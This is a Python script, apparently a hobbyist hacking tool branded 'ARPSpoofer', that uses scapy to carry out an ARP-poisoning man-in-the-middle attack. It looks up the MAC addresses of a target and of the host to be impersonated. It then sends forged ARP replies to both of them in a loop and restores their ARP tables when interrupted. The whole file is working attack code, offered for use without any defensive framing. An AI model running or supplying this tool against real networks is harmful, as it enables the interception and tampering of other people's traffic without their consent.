import scapy.all as scapy
import time
import optparse

print(''' 
    ___    ____  ____  _____                   ____         
   /   |  / __ \/ __ \/ ___/____  ____  ____  / __/__  _____
  / /| | / /_/ / /_/ /\__ \/ __ \/ __ \/ __ \/ /_/ _ \/ ___/
 / ___ |/ _, _/ ____/___/ / /_/ / /_/ / /_/ / __/  __/ /    
/_/  |_/_/ |_/_/    /____/ .___/\____/\____/_/  \___/_/     
                        /_/                                 
''')


print('''
   _      _ _   _   _ _____ _____ _____   _     _    
 | |    (_) | | | | |_   _|  ___|_   _| | |   (_)   
 | |     _| |_| |_| | | | | |_    | |   | |    _ ___
 | |    | | __|  _  | | | |  _|   | |   | |   | / __|
 | |____| | |_| | | | | | | |    _| |_  | |___| \__ \
 \_____/_|\__\_| |_/_|_| \_|    \___/  \_____/_|___/
                                                   

                                                         
    
''')








def get_values():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="targetip", help="IP address of target ------ 5H4D0W-R007 -------")
    parser.add_option("-s", "--source", dest="sourceip", help="IP address to be spoofed with ------ 5H4D0W-R007 -------")
    (values, attributes) = parser.parse_args()
    if not values.targetip and not values.sourceip:
        parser.error("[-] use --help for more info")
    if not values.targetip:
        parser.error("[-] Please specify target IP, use --help for more info")
    if not values.sourceip:
        parser.error("[-] Please specify source IP, use --help for more info")
    return values






def sc(ip):
    arp_request=scapy.ARP(pdst=ip)
    broadcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast=broadcast/arp_request
    ans_list =scapy.srp(arp_request_broadcast, timeout=1, verbose=False )[0]
    

    if len(ans_list) == 0:
        print(f"[-] No response received for IP: {ip}")
        return None
    

    return ans_list[0][1].hwsrc
    
       
      



def spoof(target_ip,spoof_ip,mac):
    if not mac:
        print(f"[-] Could not spoof {target_ip} because the MAC address is missing.")
        return
    
    packet = scapy.ARP(op=2, pdst =target_ip, hwdst=mac,psrc=spoof_ip)

    scapy.send(packet,verbose=False)








def restore(tareget_ip,spoof_id,target_mac,spoof_mac):
    
    
    packet=scapy.ARP(op=2.,pdst=tareget_ip,hwdst=target_mac,psrc=spoof_id,hwsrc=spoof_mac)

    scapy.send(packet,count=4,verbose=False)




values = get_values()
ip1=values.targetip
ip2=values.sourceip
target_mac = sc(ip1)
if target_mac is None:
    print("[-] Could not find MAC address for the target. Exiting.")
    exit()

spoof_mac = sc(ip2)
if spoof_mac is None:
    print("[-] Could not find MAC address for the spoofed IP. Exiting.")
    exit()



print(target_mac+spoof_mac)
sent_packet_count=0






try:
    while True:
        
            spoof(ip1,ip2,target_mac)
            spoof(ip2,ip1,spoof_mac)
            sent_packet_count=sent_packet_count+2
            print("\r[+] packet count "+ str(sent_packet_count),end="")
            
            time.sleep(2)
except KeyboardInterrupt:
     print("[+] Detected CTRL+C ........ Restoring ARP tables.......")
     restore(ip1,ip2,target_mac,spoof_mac)
     restore(ip2,ip1,spoof_mac,target_mac)
